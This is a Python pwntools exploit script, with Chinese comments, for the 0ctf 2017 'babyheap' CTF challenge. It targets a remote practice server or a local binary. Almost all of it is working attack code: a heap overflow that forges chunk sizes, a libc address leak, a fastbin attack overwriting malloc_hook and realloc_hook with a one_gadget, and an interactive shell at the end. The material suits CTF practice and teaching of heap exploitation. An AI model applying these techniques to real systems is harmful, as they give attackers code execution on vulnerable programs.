from pwn import *
from LibcSearcher import LibcSearcher
import sys

io = -1
############################
#********修改文件名**********
############################
file_name = '0ctf_2017_babyheap'
port = 27974

###########修改宏###########
DEBUG = 1
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if len(sys.argv) > 1 and sys.argv[1].isdigit():
    io = remote('node3.buuoj.cn', int(sys.argv[1]))
    DEBUG = False
    def STOP(*args):
        pass
elif DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)
    DEBUG = False
    def STOP(*args):
        pass

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libc))

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
context.update(os='linux', arch='amd64', log_level='debug', endian='little')
'''
fast bin attack
'''
def Allocate(size:int) -> int:
    global io
    io.sendlineafter("Command: ", '1')
    io.sendlineafter("Size: ", str(size))
    msg = io.recvline()
    return int(msg[15:-1].decode())

def Fill(idx:int, size:int, content:bytes=b'\x00'):
    global io
    io.sendlineafter("Command: ", '2')
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("Size: ", str(size))
    io.sendafter("Content: ", content)

def Free(idx:int):
    global io
    io.sendlineafter("Command: ", '3')
    io.sendlineafter("Index: ", str(idx))

def Dump(idx:int):
    global io
    io.sendlineafter("Command: ", '4')
    io.sendlineafter("Index: ", str(idx))
    io.recvuntil("Content: ")
    msg = io.recvuntil("1. Allocate\n")
    log.success('msg------>{}'.format(msg))
    return msg


Allocate(0x10) # 0
Allocate(0x60) # 1
id1 = Allocate(0x10) # 2
Allocate(0x10) # 3 

# 触发后向合并
payload = p64(0) * 3 + p64(0x91)
Fill(0, len(payload), payload)
Free(1)

# 切割chunk
id2 = Allocate(0x60)

msg = Dump(id1)
leak_addr = msg[1:7]
leak_addr = u64(leak_addr.ljust(8, b'\x00'))
if DEBUG:
    libc_base = leak_addr - 0x3c3b78
    realloc_addr = 0x83c40 + libc_base
    gadget = [0x45206, 0x4525a, 0xef9f4, 0xf0897]
else:
    libc_base = leak_addr - 0x3c4b20 - 88
    realloc_addr = 0x846c0 + libc_base
    gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
LOG_ADDR_SUCCESS('libc_base', libc_base)
LOG_ADDR_SUCCESS('realloc_addr', realloc_addr)
target_chunk_addr = leak_addr - 0x8b

# realloc_hook_offset = 0xb malloc_hook:0x13 

one_gadget = libc_base + gadget[1]
Free(id2) # 放入fastbin中

payload = p64(0) * 3 + p64(0x71) + p64(target_chunk_addr) # 修改fd指针
Fill(0, len(payload), payload)


Allocate(0x60)
id3 = Allocate(0x60)

payload = 0xb * b'a'
payload += p64(one_gadget)
payload += p64(realloc_addr + 0x8)

Fill(id3, len(payload), payload)

io.sendlineafter("Command: ", '1')
io.sendlineafter("Size: ", str(16))
io.interactive()
